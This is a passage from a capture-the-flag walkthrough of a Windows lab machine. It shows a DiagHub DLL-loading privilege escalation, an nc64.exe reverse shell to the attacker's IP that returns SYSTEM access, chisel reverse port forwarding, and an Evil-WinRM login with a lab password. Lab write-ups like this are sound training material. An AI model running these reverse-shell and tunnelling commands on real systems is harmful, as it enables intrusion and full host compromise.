PS C:<span style="color:#f1fa8c">\P</span>rogramData&gt; ls /windows/system32/Fak*

    Directory: C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/20/2020   4:50 AM         <span style="color:#bd93f9">124928</span> FakeDll.dll

PS C:<span style="color:#f1fa8c">\P</span>rogramData&gt; cacls.exe c:/windows/system32/FakeDll.dll

c:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\F</span>akeDll.dll NT AUTHORITY<span style="color:#f1fa8c">\S</span>YSTEM:<span style="color:#ff79c6">(</span>ID<span style="color:#ff79c6">)</span>F
                                BUILTIN<span style="color:#f1fa8c">\A</span>dministrators:<span style="color:#ff79c6">(</span>ID<span style="color:#ff79c6">)</span>F
                                BUILTIN<span style="color:#f1fa8c">\U</span>sers:<span style="color:#ff79c6">(</span>ID<span style="color:#ff79c6">)</span>R
                                APPLICATION PACKAGE AUTHORITY<span style="color:#f1fa8c">\A</span>LL APPLICATION PACKAGES:<span style="color:#ff79c6">(</span>ID<span style="color:#ff79c6">)</span>R
                                APPLICATION PACKAGE AUTHORITY<span style="color:#f1fa8c">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span style="color:#ff79c6">(</span>ID<span style="color:#ff79c6">)</span>R
</code></pre></td></tr></table>
</div>
</div><p>The ZipSlip attack is successful, now we can try the Diagnostic Hub exploit.</p>
<h3 id="diaghub-attack">DiagHub attack</h3>
<p>We test the r.bat file and if successful, we lauch the Diaghub attack</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\P</span>rogramData&gt; ./r.bat
C:<span style="color:#f1fa8c">\P</span>rogramData&gt;C:<span style="color:#f1fa8c">\P</span>rogramData<span style="color:#f1fa8c">\n</span>c64.exe -e cmd.exe 10.10.14.13 <span style="color:#bd93f9">8000</span>
PS C:<span style="color:#f1fa8c">\P</span>rogramData&gt; ./dh.exe FakeDll.dll
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Created dir:C:<span style="color:#f1fa8c">\P</span>rogramData<span style="color:#f1fa8c">\e</span>tw
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> CoCreateInstance
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> CoQueryProxyBlanket
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> CoSetProxyBlanket
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> service-&gt;CreateSession
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> service-&gt;AddAgent
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> DLL should have been loaded
PS C:<span style="color:#f1fa8c">\P</span>rogramData&gt;
─────────────────────────────────────────────────────────────────────────────────────────────────────
_  ~ rlwrap nc -lnvp <span style="color:#bd93f9">8000</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8000</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">61398</span>
Microsoft Windows <span style="color:#ff79c6">[</span>Version 10.0.17763.107<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2018</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#f1fa8c">\P</span>rogramData&gt;exit
_  ~ rlwrap nc -lnvp <span style="color:#bd93f9">8000</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8000</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">61404</span>
Microsoft Windows <span style="color:#ff79c6">[</span>Version 10.0.17763.107<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2018</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;whoami
whoami
nt authority<span style="color:#f1fa8c">\s</span>ystem
</code></pre></td></tr></table>
</div>
</div><h1 id="evil-winrm--remote-desktop-connection">Evil-WinRM : Remote Desktop connection</h1>
<p>Downloading remote desktop <code>brew install microsoft-remote-desktop-beta</code> failed,
so we get it from the Apple Store &lsquo;Microsoft Remote Desktop 10&rsquo;.
Unfortunately I am not successful to connect with remote desktop connection.
Indeed port 5985 was not in our initial nmap, therefore it may be blocked by firewall.
We should be able to reverse forward this port on our local machine using <code>chisel</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; netstat -an | findstr LIST
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
  TCP    10.10.10.144:139       0.0.0.0:0              LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:80                <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:135               <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:445               <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:5985              <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:47001             <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:49664             <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:49665             <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:49666             <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:49667             <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:49668             <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
  TCP    <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:49669             <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:0                 LISTENING
</code></pre></td></tr></table>
</div>
</div><p>We install chisel on Linux, with some flags to reduce the size of the binary</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; <span style="color:#8be9fd;font-style:italic">cd</span> /ProgramData/chisel
PS C:<span style="color:#f1fa8c">\P</span>rogramData<span style="color:#f1fa8c">\c</span>hisel&gt; ./chisel.exe client 10.10.14.13:8002 R:5985:127.0.0.1:5985
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
git clone https://github.com/jpillora/chisel
<span style="color:#8be9fd;font-style:italic">cd</span> chisel
sudo go build -ldflags<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;-s -w&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>And we start the server on port 8085 after forwarding it to our container <code>ssh username@localhost -L $HTB:5985:192.168.99.100:8085</code></p>
<p>We start as well a client, on the target machine</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">_  chisel git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> ./chisel server --host 0.0.0.0 --port <span style="color:#bd93f9">8002</span> --reverse
2020/02/20 09:29:47 server: Reverse tunnelling enabled
2020/02/20 09:29:47 server: Fingerprint f7:d5:5e:dc:9f:94:b8:6d:fa:0f:89:f8:d9:c6:04:9d
2020/02/20 09:29:47 server: Listening on 0.0.0.0:8002...

2020/02/20 09:30:05 server: proxy#1:R:0.0.0.0:5985<span style="color:#ff79c6">=</span>&gt;127.0.0.1:5985: Listening
</code></pre></td></tr></table>
</div>
</div><p>We have a proxy connection established on our local port 5985</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">_  htb ss -lntp | egrep <span style="color:#f1fa8c">&#34;5985&#34;</span>
LISTEN   <span style="color:#bd93f9">0</span>         <span style="color:#bd93f9">0</span>                   0.0.0.0:5985             0.0.0.0:*        users:<span style="color:#ff79c6">((</span><span style="color:#f1fa8c">&#34;chisel&#34;</span>,pid<span style="color:#ff79c6">=</span>2748,fd<span style="color:#ff79c6">=</span>6<span style="color:#ff79c6">))</span>
</code></pre></td></tr></table>
</div>
</div><p>We can now attempt the evil-WinRM</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">_  evil-winrm git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> _ ruby ./evil-winrm.rb -i localhost -P <span style="color:#bd93f9">5985</span> -u coby -p championship2005

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\c</span>oby<span style="color:#f1fa8c">\D</span>ocuments&gt; whoami
re<span style="color:#f1fa8c">\c</span>oby
</code></pre></td></tr></table>
</div>
</div><p>Awesome</p>
<h1 id="further-exploration">Further exploration</h1>
<h2 id="program-installed">program installed</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\c</span>oby<span style="color:#f1fa8c">\D</span>ocuments&gt; ls /<span style="color:#f1fa8c">&#34;Program Files&#34;</span>

    Directory: C:<span style="color:#f1fa8c">\P</span>rogram Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/14/2019  10:48 AM                Java
d-----        3/13/2019   6:47 PM                LibreOffice
d-----        3/14/2019   5:13 AM                Notepad++
d-----        3/20/2019   2:11 PM                PeaZip
d-----        3/14/2019   6:35 AM                Sysinternals

*Evil-WinRM* PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>esktop&gt; download root.txt

Warning: Remember that in docker environment all <span style="color:#8be9fd;font-style:italic">local</span> paths should be at /data and it must be mapped correctly as a volume on docker run <span style="color:#8be9fd;font-style:italic">command</span>

Info: Downloading C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\A</span>dministrator<span style="color:#f1fa8c">\D</span>esktop<span style="color:#f1fa8c">\r</span>oot.txt to root.txt


Info: Download successful!
</code></pre></td></tr></table>
</div>
</div><p>That&rsquo;s super handy</p>
<h2 id="sysinternals">Sysinternals</h2>
<p>With other users, we are not able to control the services privileges; However, the user iis belongs to SVCManager group</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\P</span>rogram Files<span style="color:#f1fa8c">\S</span>ysinternals&gt; whoami
iis apppool<span style="color:#f1fa8c">\r</span>e
PS C:<span style="color:#f1fa8c">\P</span>rogram Files<span style="color:#f1fa8c">\S</span>ysinternals&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          <span style="color:#8be9fd;font-style:italic">Attributes</span>
<span style="color:#ff79c6">====================================</span> <span style="color:#ff79c6">================</span> <span style="color:#ff79c6">============</span> <span style="color:#ff79c6">==================================================</span>
Mandatory Label<span style="color:#f1fa8c">\H</span>igh Mandatory Level Label            S-1-16-12288
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN<span style="color:#f1fa8c">\U</span>sers                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span style="color:#f1fa8c">\S</span>ERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span style="color:#f1fa8c">\A</span>uthenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span style="color:#f1fa8c">\T</span>his Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN<span style="color:#f1fa8c">\I</span>IS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
